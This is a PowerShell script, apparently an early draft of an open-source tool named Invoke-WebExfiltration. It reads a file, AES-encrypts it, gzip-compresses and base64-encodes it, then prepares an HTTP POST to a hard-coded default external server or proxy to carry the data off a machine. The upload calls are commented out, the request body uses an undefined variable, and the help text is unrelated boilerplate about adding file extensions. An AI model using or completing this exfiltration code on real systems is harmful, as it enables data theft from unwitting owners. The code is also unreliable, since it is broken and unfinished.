

Function Invoke-WebExfiltration {
     <#
        .SYNOPSIS
        PowerShell function to exfiltrate data via HTTP(s) POST request (with file gzip compression)
        Author: Philipp Rieth

        .DESCRIPTION
        ...




        .PARAMETER Name
        Specifies the file name.

        .PARAMETER Extension
        Specifies the extension. "Txt" is the default.

        .INPUTS
        None. You cannot pipe objects to Add-Extension.

        .OUTPUTS
        System.String. Add-Extension returns a string with the extension or file name.

        .EXAMPLE
        PS> extension -name "File"
        File.txt

        .EXAMPLE
        PS> extension -name "File" -extension "doc"
        File.doc

        .EXAMPLE
        PS> extension "File" "doc"
        File.doc

        .LINK
        GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration

    #>

    [cmdletbinding()]
    Param(
        [Parameter(
                Position = 0,
                Mandatory = $true,
                # ValueFromPipelineByPropertyName=$true,
                ValueFromPipeline = $true
        )]$File,
        [Parameter(
                Position = 1,
                Mandatory = $false
        #ValueFromPipelineByPropertyName=$true
        )]
        [string[]]$Target = 'https://pr.seceit.net',
        [string]$Password,
        [string]$Proxy,
        [switch]$unencrypted

    )

    Begin {
        Write-Host "[~] Target server: '$target'"
        if ($Proxy){
            Write-Host "[!] Using HTTP proxy: '$Proxy'"
        }
        if ((-Not $Password) -And (-Not $unencrypted)) {
            # $Password = Read-Host -AsSecureString "Password"
            $Password = Read-Host -MaskInput "[*] Password"

            if (-Not $Password){
                Write-Host "[!] You provided an empty password! Files and file names will not be encrypted."
                $yes_no = Read-Host "[!] Do you wish to continue? (y/N)"

                if ($yes_no -like "y*"){
                    $unencrypted = $true
                    Write-Host "[!] Files and file names will not be encrypted"
                } else {
                    Write-Host "[X] Exit"
                    Break
                }
            }

        }elseif ($Password -and $unencrypted){
            Write-Host "[X] You can't specifiy '-Password' and '-Unencrypted' at the same time"
            break
        }

        Write-Host "[-]"
    }

    Process {
         if ((Get-Item $file) -is [System.IO.DirectoryInfo]){
             Write-Verbose "'$file' is a directory. Skipping..."
             return
         }

        Write-Host "[+] Exfiltrating file '$file'"

        # read file bytes and get file names
        $file_name = [System.IO.Path]::GetFileName($file)
        $file_bin = [IO.File]::ReadAllBytes($file)

        Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"

         # AES encrypt
         # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed

        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256

        $encryptor = $aesManaged.CreateEncryptor()
        $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
        $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted
        $aesManaged.Dispose()

        Write-Verbose "AES-256 encrypted '$file_name'"

        # Gzip compress content
        # Undo: cat LICENSE.gzip.b64 | base64 -d | gzip -d
        Write-Verbose "Gzip compressing file '$file_name'"
        # Compress Data via gzip stream
        $ms = New-Object IO.MemoryStream
        $cs = New-Object System.IO.Compression.GZipStream ($ms, [Io.Compression.CompressionMode]"Compress")
        $cs.Write($file_bin_encrypted, 0, $file_bin_encrypted.Length)
        $cs.Close()
        Write-Verbose "Compressed '$file_name'"

        # convert to base64 string
        $gzip_b64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Close()

        $gzip_b64 | Out-File "$file_bin.aes256.gzip.b64"

        # ToDo: Add secrent as an HTTP header, like an API key so unrestricted people can't upload?

        $body = @{

            "b64" = "$file_b64"
        }

        Write-Verbose "Uploading file '$file_name'"
        $uri = [uri]::EscapeUriString($target)

        try {
            if ($Proxy){
                $uriProxy = [uri]::EscapeUriString($Proxy)

                # ToDo: implement prameter -insecure
                # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
                # Invoke-RestMethod -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
            } else {
                # Invoke-RestMethod -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
            }
        }

        catch
        {
            Write-Host "ERROR: StatusCode:" $_.Exception.Response.StatusCode.value__
            Write-Host "ERROR: StatusDescription:" $_.Exception.Response.StatusDescription
            Write-Host "ERROR: An error occurred (I've no idea what's going on)"
            throw
        }

        Write-Verbose "Uploaded '$file_name'"
    }

     End {
         Write-Host "[-]"
         Write-Host "[~] All done!"
     }
}


function AES-Encrypt {


    # Copied from here https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1



}
